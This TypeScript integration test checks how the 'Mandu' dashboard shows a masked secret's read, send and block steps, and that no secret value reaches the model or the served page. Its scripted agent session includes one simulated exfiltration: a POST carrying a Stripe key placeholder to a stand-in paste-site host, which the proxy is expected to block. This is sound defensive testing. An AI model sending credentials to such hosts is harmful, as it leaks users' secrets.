/**
 * session-page-secret-steps — a secret's card on a session's page shows its
 * steps, keeping only the turns that hold them, across the REAL components
 * (dashboard.md §4.25b *A card shows its steps*). Mandu-new.
 *
 * A card counted what happened to its secret but linked one step a line,
 * and *Only where Mandu stepped in* keeps every turn where Mandu masked any
 * secret. Here a real ArbiterServer runs at the `secrets` axes with two
 * secret files labelled in policy.yaml, each masked whole and so one card:
 * `.env` (a Stripe key), bound to `api.stripe.example`, and `db.env` (a
 * database password), bound nowhere. The
 * REAL anthropic-proxy on its production client carries a session of seven
 * turns that reads each file in a turn of its own among ordinary reads; the
 * agent's program sends the Stripe key's placeholder to its bound host
 * (released with its value) and, in a later turn, to a paste site (blocked)
 * through the REAL net-proxy on its production client. A real
 * DashboardServer over the production adapter serves the session's page:
 *
 *   K1  the served record: the `.env` card's steps hold its read, its send
 *       and its block, in the turns they happened in, and the `db.env`
 *       card's only its read; neither holds a model request;
 *   K2  the served page: pressing the `.env` card's *Show its steps* leaves
 *       visible exactly the three turns of its read, send and block, the
 *       others folded behind lines that say Mandu found no step of it, its
 *       line above the story with the focus; *Show every turn* puts every
 *       turn back;
 *   K3  the oracle: the model never got either value, and no answer or drawn
 *       page carries either, nor a token (`$MDU`) on the product side;
 *   K4  step by step (queue #244), in a real headless Chromium with the
 *       served stylesheet: *Show its steps*, then *Next step* twice: the
 *       focus is on the card's second drawn step, inside the viewport, the
 *       only `.secret-at` row (outlined), and the line and the polite status
 *       say "Step 2 of N";
 *   K5  the card's last line (queue #247), in a real headless Chromium at
 *       1280 and 390 px: on each card with both, *Change it in Rules* and
 *       *Show its steps* are at least 8 px apart or the button wraps under
 *       the link (a bare space left them 3 px apart), no text between them;
 *       the button still filters the story and the link still opens Rules.
 *       K4 and K5 self-SKIP without a Chromium (probeBrowser:
 *       MANDU_TOUR_BROWSER, CHROME_PATH, a Playwright headless shell).
 *
 * Axes: secrets (stated; the arbiter's confidentiality pinned ON). What is
 * under test is the served page; the stack supplies the real session and
 * the events each card's steps are found from.
 */
import { test, after } from "node:test";
import assert from "node:assert/strict";
import { Readable } from "node:stream";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { request as httpRequest } from "node:http";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { resetCurrentPolicyForTests } from "../../arbiter/policy/compiled-policy.js";
import { AnthropicProxy, type UpstreamFetcher } from "../../interceptors/anthropic-proxy/src/proxy.js";
import { ArbiterClientAdapter } from "../../interceptors/anthropic-proxy/src/arbiter-client.js";
import { buildTextSse, buildToolUseSse } from "../../interceptors/anthropic-proxy/test/helpers/mock-upstream.js";
import { NetProxy } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter as NetArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import { DashboardServer } from "../../dashboard/src/server.js";
import { ArbiterEventSource } from "../../dashboard/src/event-source.js";
import { makeApprovalsArbiter } from "../../dashboard/src/arbiter-adapter.js";
import type { AgentPageVM } from "../../dashboard/src/view-model/agent-page.js";
import { servedProductPage } from "../../dashboard/test/unit/ui/served-page.js";
import { pageFetch } from "../../dashboard/test/unit/page-fetch.js";
import { stateAxes } from "../lib/axes.js";

stateAxes("secrets"); // confidentiality ON, integrity OFF: the axis under test

const REPO = join(dirname(fileURLToPath(import.meta.url)), "..", "..");
// eslint-disable-next-line @typescript-eslint/no-explicit-any
interface Cdp { send(method: string, params?: object, sessionId?: string): Promise<any>; close(): void }
const tour = (await import(pathToFileURL(join(REPO, "scripts", "tour-screenshots.mjs")).href)) as {
  probeBrowser: (o?: object) => string | null;
  startBrowser: (path: string, dataDir: string, env: NodeJS.ProcessEnv) => Promise<{ proc: unknown; wsUrl: string }>;
  stopProc: (proc: unknown) => Promise<void>;
  Cdp: { connect(url: string): Promise<Cdp> };
};
const chromium = tour.probeBrowser({});

after(() => resetCurrentPolicyForTests("claude-code"));

const SESSION = `1791850000-${process.pid}`;
const STRIPE = `sk_live_secretSteps_${process.pid}_000000`;
const DBPASS = `pw-secretSteps-${process.pid}-111111`;
const render = (s: string) => s.split("\n").slice(0, -1).map((l, i) => `${String(i + 1).padStart(6)}\t${l}`).join("\n") + "\n";
// eslint-disable-next-line @typescript-eslint/no-explicit-any
type El = any;

/** One absolute-form request through the forward proxy. */
function viaProxy(port: number, url: string, body: string): Promise<{ status: number; body: string }> {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
        res.on("error", reject);
      },
    );
    req.on("error", reject);
    req.end(body);
  });
}

/** The seven questions, in order: `env` reads the Stripe key's file, `db`
 *  the database password's, `send` sends the Stripe key to its bound host,
 *  `paste` to a paste site, `talk` has no step. */
const TURNS = [
  { q: "List what is in notes.txt", kind: "read" },
  { q: "What is in .env?", kind: "env" },
  { q: "And in db.env?", kind: "db" },
  { q: "Charge the test card", kind: "send" },
  { q: "Summarize notes.txt", kind: "read" },
  { q: "Post the key to the paste site", kind: "paste" },
  { q: "Thanks, that is all for now", kind: "talk" },
] as const;

test("a secret's Show its steps on the real session page keeps exactly the turns of its read, send and block, and no value is shown (secrets axes, explicit)", { timeout: 240_000 }, async (t) => {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-secret-steps-"));
  const ws = join(tmp, "ws");
  mkdirSync(ws, { recursive: true });
  const notes = join(ws, "notes.txt");
  const env = join(ws, ".env");
  const db = join(ws, "db.env");
  writeFileSync(notes, "Buy milk.\nShip the parser.\n");
  writeFileSync(env, `STRIPE_KEY=${STRIPE}\n`);
  writeFileSync(db, `DB_PASSWORD=${DBPASS}\n`);
  const policyPath = join(tmp, "policy.yaml");
  writeFileSync(policyPath, [
    "version: 1",
    "paths:",
    `  - path: ${env}`, "    level: no-model", "    bindings: [api.stripe.example]",
    `  - path: ${db}`, "    level: no-model",
    "",
  ].join("\n"));
  const sock = join(tmp, "arbiter.sock");
  const adminSock = join(tmp, "admin.sock");
  const humanSock = join(tmp, "human", "h.sock");
  mkdirSync(join(tmp, "human"), { mode: 0o700 });
  const arbiter = new ArbiterServer({
    socketPath: sock, adminSocketPath: adminSock, humanSocketPath: humanSock, dbPath: join(tmp, "mandu.db"), eventDir: join(tmp, "events"),
    policyPath, policyPollMs: 0, log: () => {}, confidentiality: true, integrity: false,
  });
  await arbiter.listen();
  const data = new ArbiterClient(sock); await data.connect();
  const human = new ArbiterClient(humanSock); await human.connect();
  const wired = await makeApprovalsArbiter(sock, () => ({ socketPath: adminSock }));
  assert.ok(wired, "the production wiring");
  const dashboard = new DashboardServer({
    source: new ArbiterEventSource({ socketPath: sock, humanSocketPath: humanSock }),
    approvalsArbiter: wired.arbiter, secretsArbiter: wired.secrets, policyDocArbiter: wired.policyDoc,
    configEnv: { MANDU_HOME: join(tmp, "home") }, log: () => {},
  });
  const base = `http://127.0.0.1:${await dashboard.listen(0)}`;
  // The scripted model answers each request with the next of `replies`.
  const replies: string[] = [];
  const seen: string[] = [];
  const upstream: UpstreamFetcher = async ({ body }) => {
    seen.push(body.toString("utf8"));
    const sse = replies.shift() ?? buildTextSse("Done.", { deltas: 1 });
    return { status: 200, headers: { "content-type": "text/event-stream" }, body: Readable.from([Buffer.from(sse, "utf8")]) };
  };
  const proxy = new AnthropicProxy({ arbiter: new ArbiterClientAdapter(data, human), upstream, sessionKey: SESSION, log: () => {} });
  const port = await proxy.listen(0);
  // The net-proxy as production wires it (net-proxy/src/server-main.ts).
  const forwarded: Array<{ url: string; body: string }> = [];
  const net = new NetProxy({
    arbiter: new NetArbiterClientAdapter(data as unknown as RealArbiterClient, human),
    sessionId: SESSION,
    forwarder: async ({ url, body }) => {
      forwarded.push({ url, body: body?.toString("utf8") ?? "" });
      return { status: 200, headers: { "content-type": "text/plain" }, body: Buffer.from("ok") };
    },
    log: () => {},
  });
  const netPort = await net.listen(0);
  type Msg = { role: string; content: unknown };
  const ask = async (messages: Msg[], reply: string): Promise<string> => {
    replies.push(reply);
    const res = await pageFetch(`http://127.0.0.1:${port}/v1/messages`, {
      method: "POST",
      headers: { "content-type": "application/json", "x-mandu-session-id": SESSION, "anthropic-version": "2023-06-01" },
      body: JSON.stringify({ model: "claude-opus-4", stream: true, max_tokens: 512, tools: [{ name: "Read", input_schema: { type: "object" } }], messages }),
    });
    assert.equal(res.status, 200, await res.text());
    return seen.at(-1)!;
  };
  const noValue = (text: string, where: string) => {
    assert.ok(!text.includes(STRIPE), `CONFIDENTIALITY VIOLATION: ${where} carries the Stripe key`);
    assert.ok(!text.includes(DBPASS), `CONFIDENTIALITY VIOLATION: ${where} carries the database password`);
    assert.doesNotMatch(text, /\$MDU/, `${where} carries a token`);
  };
  const getPage = async (): Promise<{ text: string; vm: AgentPageVM }> => {
    const r = await pageFetch(`${base}/api/home/agent?session=${SESSION}`);
    assert.equal(r.status, 200);
    const text = await r.text();
    return { text, vm: JSON.parse(text) as AgentPageVM };
  };
  try {
    // ── The session: seven turns, one request a step ──
    let history: Msg[] = [];
    let symbol: string | undefined;
    for (const [i, t] of TURNS.entries()) {
      const q: Msg[] = [...history, { role: "user", content: t.q }];
      if (t.kind === "talk") {
        await ask(q, buildTextSse("You are welcome.", { deltas: 1 }));
        history = [...q, { role: "assistant", content: "You are welcome." }];
        continue;
      }
      if (t.kind === "send" || t.kind === "paste") {
        await ask(q, buildTextSse("Sending it now.", { deltas: 1 }));
        await new Promise((r) => setTimeout(r, 20)); // the send comes strictly inside this turn
        if (t.kind === "send") {
          // To the host its rule binds it to: released with its real value.
          const res = await viaProxy(netPort, "http://api.stripe.example/v1/charges", `key=${symbol}`);
          assert.equal(res.status, 200, `the real net-proxy releases a bound send: ${res.body}`);
          assert.equal(forwarded.length, 1);
          assert.ok(forwarded[0]!.body.includes(STRIPE), "the bound host got the real value");
        } else {
          // To a host no rule binds it to: blocked, held for an OK.
          const res = await viaProxy(netPort, "http://paste.steps.example/collect", `d=${symbol}`);
          assert.equal(res.status, 403, "the real net-proxy blocks an unbound send");
          assert.ok(!res.body.includes(STRIPE));
          assert.equal(forwarded.length, 1, "nothing more left the machine");
        }
        await new Promise((r) => setTimeout(r, 20));
        history = [...q, { role: "assistant", content: "Sending it now." }];
        continue;
      }
      const file = t.kind === "env" ? env : t.kind === "db" ? db : notes;
      const content = t.kind === "env" ? `STRIPE_KEY=${STRIPE}\n` : t.kind === "db" ? `DB_PASSWORD=${DBPASS}\n` : "Buy milk.\nShip the parser.\n";
      const id = `toolu_steps_${i}`;
      await ask(q, buildToolUseSse({ id, name: "Read", input: { file_path: file } }));
      const withResult: Msg[] = [
        ...q,
        { role: "assistant", content: [{ type: "tool_use", id, name: "Read", input: { file_path: file } }] },
        { role: "user", content: [{ type: "tool_result", tool_use_id: id, content: render(content) }] },
      ];
      const got = await ask(withResult, buildTextSse("Done.", { deltas: 1 }));
      assert.ok(!got.includes(STRIPE) && !got.includes(DBPASS), "CONFIDENTIALITY VIOLATION: the model got a secret's value");
      if (t.kind === "env") {
        symbol = /\$MDU:[A-Za-z]+_Read\[[0-9a-f]+\](?:\.[A-Z_]+)?/.exec(got)?.[0];
        assert.ok(symbol, "the model got the Stripe key's placeholder");
      }
      if (t.kind === "db") assert.match(got, /\$MDU:[A-Za-z]+_Read\[[0-9a-f]+\]/, "the model got the password's placeholder");
      history = [...withResult, { role: "assistant", content: "Done." }];
      await new Promise((r) => setTimeout(r, 5));
    }

    // ── K1: the served record ──
    let page = await getPage();
    // Each file masked whole: a card names its file.
    const cardOf = (vm: AgentPageVM, name: string) => vm.secrets.secrets.find((c) => c.what.some((p) => p.kind === "code" && p.text.endsWith(name)));
    const settled = (vm: AgentPageVM) => vm.story.length === TURNS.length && (cardOf(vm, "/.env")?.turns?.length ?? 0) === 3 && (cardOf(vm, "/db.env")?.turns?.length ?? 0) === 1;
    for (let i = 0; i < 200 && !settled(page.vm); i++) {
      await new Promise((r) => setTimeout(r, 25));
      page = await getPage();
    }
    assert.deepEqual(page.vm.story.map((t) => t.prompt), TURNS.map((t) => t.q), "the seven turns, in order");
    const ids = page.vm.story.map((t) => t.id);
    const stripe = cardOf(page.vm, "/.env");
    const dbCard = cardOf(page.vm, "/db.env");
    assert.ok(stripe && dbCard, `two cards: ${JSON.stringify(page.vm.secrets.secrets.map((c) => c.what))}`);
    assert.deepEqual(stripe.turns, [ids[1], ids[3], ids[5]], `its read, its send and its block: ${JSON.stringify(stripe)}`);
    assert.deepEqual(dbCard.turns, [ids[2]], "the password's read only");
    const stepTurn = new Map(page.vm.story.flatMap((t) => t.steps.map((st) => [st.id, t.id] as const)));
    assert.ok(stripe.steps!.every((id) => stepTurn.has(id)), "every step is one the page draws");
    const outcomes = stripe.steps!.map((id) => page.vm.story.flatMap((t) => t.steps).find((st) => st.id === id)).map((st) => (st && st.kind === "action" ? st.outcome : null));
    assert.ok(outcomes.includes("sent") && outcomes.includes("blocked"), `the send and the block are its steps: ${JSON.stringify(outcomes)}`);
    assert.equal(stripe.earlierTurns, undefined);
    noValue(page.text, "/api/home/agent");

    // ── K2: the served page ──
    const shown = (doc: El) => ([...doc.querySelectorAll("#agent-story article.turn[data-turn-id]")] as El[]).filter((t) => !t.closest("[hidden]")).map((t) => t.dataset.turnId);
    const lines = (doc: El) => [...doc.querySelectorAll("#agent-story .story-quiet")] as El[];
    const button = (doc: El, name: string) => ([...doc.querySelectorAll("#agent-secrets .secret-card")] as El[])
      .find((c) => c.querySelector(".secret-what code")?.textContent.endsWith(name))?.querySelector("button.secret-steps");
    await servedProductPage(base, `/agents/${SESSION}`, (doc) => !!button(doc, "/.env") && !!button(doc, "/db.env"), (doc) => {
      assert.deepEqual(shown(doc), ids, "every turn before the press");
      const btn = button(doc, "/.env");
      assert.equal(btn.textContent, "Show its steps");
      btn.click();
      assert.deepEqual(shown(doc), [ids[1], ids[3], ids[5]], "exactly the turns of its read, its send and its block");
      assert.deepEqual(lines(doc).map((l) => l.querySelector("span").textContent), [
        "1 turn where Mandu found no step of this secret", "1 turn where Mandu found no step of this secret", "1 turn where Mandu found no step of this secret", "1 turn where Mandu found no step of this secret",
      ], "each run of the others in its place");
      const line = doc.getElementById("agent-secret-only");
      // Its steps are more than one, so the line steps through them (K4).
      assert.equal(line.textContent.replace(/\s+/g, " "), `Showing the 3 turns where Mandu found a step of the file ${env}. Previous step Next step Show every turn`);
      assert.equal(doc.activeElement, line, "the line takes the focus");
      assert.equal(doc.getElementById("agent-story-status").textContent, `Showing the 3 turns where Mandu found a step of the file ${env}.`);
      noValue(doc.body.textContent, "the filtered session page");
      // The password's card keeps only its read.
      button(doc, "/db.env").click();
      assert.deepEqual(shown(doc), [ids[2]]);
      // Show every turn: the story as it was.
      doc.getElementById("agent-secret-only").querySelector("button.secret-all").click();
      assert.deepEqual(shown(doc), ids);
      assert.equal(lines(doc).length, 0);
      assert.equal(doc.defaultView.location.search, "", "never in the address");
      noValue(doc.body.textContent, "the rendered session page");
    });

    // ── K4: step by step, in a real Chromium ──
    const drawn = stripe.steps!.filter((id) => stepTurn.has(id));
    assert.ok(drawn.length >= 3, `its read, send and block are drawn: ${JSON.stringify(drawn)}`);
    await t.test("K4: in a real Chromium, Next step twice lands on the card's second drawn step, in view, the only one outlined", {
      skip: chromium ? false : "no Chromium found (MANDU_TOUR_BROWSER, CHROME_PATH, a Playwright headless shell)",
    }, async () => {
      const chrome = join(tmp, "chrome");
      const { proc, wsUrl } = await tour.startBrowser(chromium as string, chrome, process.env);
      const cdp = await tour.Cdp.connect(wsUrl);
      try {
        const { targetId } = await cdp.send("Target.createTarget", { url: "about:blank" });
        const { sessionId } = await cdp.send("Target.attachToTarget", { targetId, flatten: true });
        const send = (method: string, params: object = {}) => cdp.send(method, params, sessionId);
        const evaluate = async (expression: string) => {
          const r = await send("Runtime.evaluate", { expression, returnByValue: true, awaitPromise: true });
          if (r.exceptionDetails) throw new Error(`page script failed: ${r.exceptionDetails.exception?.description ?? r.exceptionDetails.text}`);
          return r.result.value;
        };
        const until = async (what: string, expression: string) => {
          let ok = false;
          for (const end = Date.now() + 30_000; Date.now() < end && !ok; await new Promise((r) => setTimeout(r, 100))) {
            try { ok = await evaluate(expression); } catch { /* navigating */ }
          }
          assert.ok(ok, what);
        };
        await send("Page.enable");
        await send("Runtime.enable");
        await send("Emulation.setDeviceMetricsOverride", { width: 1280, height: 700, deviceScaleFactor: 1, mobile: false });
        await send("Page.navigate", { url: `${base}/agents/${SESSION}` });
        const btn = `[...document.querySelectorAll("#agent-secrets .secret-card")].find((c) => (c.querySelector(".secret-what code")?.textContent || "").endsWith("/.env"))?.querySelector("button.secret-steps")`;
        await until("the page drew the card", `(() => !!(${btn}) && document.fonts.status === "loaded")()`);
        await evaluate(`(${btn}).click()`);
        await until("the line has Next step", `!!document.querySelector("#agent-secret-only button.secret-next")`);
        await evaluate(`document.querySelector("#agent-secret-only button.secret-next").click()`);
        await evaluate(`document.querySelector("#agent-secret-only button.secret-next").click()`);
        // The scroll is the browser's own (scrollIntoView): let it settle.
        await new Promise((r) => setTimeout(r, 300));
        const m = await evaluate(`(() => {
          const f = document.activeElement;
          const r = f.getBoundingClientRect();
          return {
            focused: f.dataset ? f.dataset.stepId : null, top: r.top, bottom: r.bottom, h: innerHeight,
            at: [...document.querySelectorAll("#agent-story .secret-at")].map((x) => x.dataset.stepId),
            outline: getComputedStyle(f).outlineStyle, where: document.querySelector("#agent-secret-only .secret-where").textContent,
            status: document.getElementById("agent-story-status").textContent, body: document.body.innerText,
          };
        })()`);
        const of = `Step 2 of ${drawn.length}`;
        assert.equal(m.focused, drawn[1], "the focus is on the card's second drawn step");
        assert.ok(m.top >= 0 && m.bottom <= m.h, `inside the viewport (${m.top}..${m.bottom} of ${m.h})`);
        assert.deepEqual(m.at, [drawn[1]], "the only .secret-at row");
        assert.equal(m.outline, "solid", "outlined, while it has the focus");
        assert.equal(m.where, of);
        assert.equal(m.status, of);
        noValue(m.body, "the page in Chromium");
      } finally {
        cdp.close();
        await tour.stopProc(proc);
      }
    });

    // ── K5: the card's two controls sit apart, in a real Chromium ──
    await t.test("K5: in a real Chromium at 1280 and 390 px, each card's Change it in Rules and Show its steps are at least 8 px apart or on rows of their own, and each still works", {
      skip: chromium ? false : "no Chromium found (MANDU_TOUR_BROWSER, CHROME_PATH, a Playwright headless shell)",
    }, async () => {
      const chrome = join(tmp, "chrome-k5");
      const { proc, wsUrl } = await tour.startBrowser(chromium as string, chrome, process.env);
      const cdp = await tour.Cdp.connect(wsUrl);
      try {
        const { targetId } = await cdp.send("Target.createTarget", { url: "about:blank" });
        const { sessionId } = await cdp.send("Target.attachToTarget", { targetId, flatten: true });
        const send = (method: string, params: object = {}) => cdp.send(method, params, sessionId);
        const evaluate = async (expression: string) => {
          const r = await send("Runtime.evaluate", { expression, returnByValue: true, awaitPromise: true });
          if (r.exceptionDetails) throw new Error(`page script failed: ${r.exceptionDetails.exception?.description ?? r.exceptionDetails.text}`);
          return r.result.value;
        };
        const until = async (what: string, expression: string) => {
          let ok = false;
          for (const end = Date.now() + 30_000; Date.now() < end && !ok; await new Promise((r) => setTimeout(r, 100))) {
            try { ok = await evaluate(expression); } catch { /* navigating */ }
          }
          assert.ok(ok, what);
        };
        await send("Page.enable");
        await send("Runtime.enable");
        const card = (name: string) => `[...document.querySelectorAll("#agent-secrets .secret-card")].find((c) => (c.querySelector(".secret-what code")?.textContent || "").endsWith(${JSON.stringify(name)}))`;
        const open = async (width: number) => {
          await send("Emulation.setDeviceMetricsOverride", { width, height: 900, deviceScaleFactor: 1, mobile: width < 760 });
          await send("Page.navigate", { url: `${base}/agents/${SESSION}` });
          await until(`the page drew both cards at ${width} px`, `(() => !!(${card("/.env")})?.querySelector("button.secret-steps") && !!(${card("/db.env")})?.querySelector("button.secret-steps") && document.fonts.status === "loaded")()`);
        };
        for (const width of [1280, 390]) {
          await open(width);
          const rows = await evaluate(`[...document.querySelectorAll("#agent-secrets .secret-card > .secret-rule")].map((row) => {
            const a = row.querySelector("a.secret-rule-link"); const b = row.querySelector("button.secret-steps");
            if (!a || !b) return null;
            const ar = a.getBoundingClientRect(); const br = b.getBoundingClientRect();
            return { apart: br.left - ar.right, wrapped: br.top >= ar.bottom, display: getComputedStyle(row).display,
              text: [...row.childNodes].filter((n) => n.nodeType === 3).map((n) => n.textContent) };
          }).filter(Boolean)`) as Array<{ apart: number; wrapped: boolean; display: string; text: string[] }>;
          assert.equal(rows.length, 2, `${width} px: both cards have the link and the button`);
          for (const r of rows) {
            assert.equal(r.display, "flex", `${width} px: the card's last line is a flex row`);
            assert.deepEqual(r.text, [], `${width} px: no text between the link and the button`);
            assert.ok(r.wrapped || r.apart >= 8, `${width} px: the button is ${r.apart} px right of the link (at least 8), or on a row under it`);
          }
          noValue(String(await evaluate("document.body.innerText")), `the page in Chromium at ${width} px`);
        }
        // The button still filters the story (at 390 px, as a phone).
        await evaluate(`(${card("/.env")}).querySelector("button.secret-steps").click()`);
        await until("the story keeps only the .env card's turns", `(() => { const shown = [...document.querySelectorAll("#agent-story article.turn[data-turn-id]")].filter((t) => !t.closest("[hidden]")).map((t) => t.dataset.turnId); return JSON.stringify(shown) === ${JSON.stringify(JSON.stringify([ids[1], ids[3], ids[5]]))}; })()`);
        // The link still opens Rules at its file (the address drops ?file=
        // once Rules has used it, tests/stack/secret-card-rules-link.test.ts).
        assert.equal(await evaluate(`(${card("/.env")}).querySelector("a.secret-rule-link").getAttribute("href")`), `/rules?file=${env}`);
        await evaluate(`(${card("/.env")}).querySelector("a.secret-rule-link").click()`);
        await until("the link opened Rules", `location.pathname === "/rules" && document.getElementById("page-rules").hidden === false`);
      } finally {
        cdp.close();
        await tour.stopProc(proc);
      }
    });

    // ── K3: the oracle ──
    const model = seen.join("\n");
    assert.ok(!model.includes(STRIPE) && !model.includes(DBPASS), "CONFIDENTIALITY VIOLATION: the model got a secret's value");
    for (const route of ["/api/home", "/api/home/history", `/api/home/agent?session=${SESSION}`]) {
      noValue(await (await pageFetch(base + route)).text(), route);
    }
  } finally {
    await proxy.close();
    await net.close();
    await dashboard.close();
    wired?.close();
    data.close();
    human.close();
    await arbiter.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
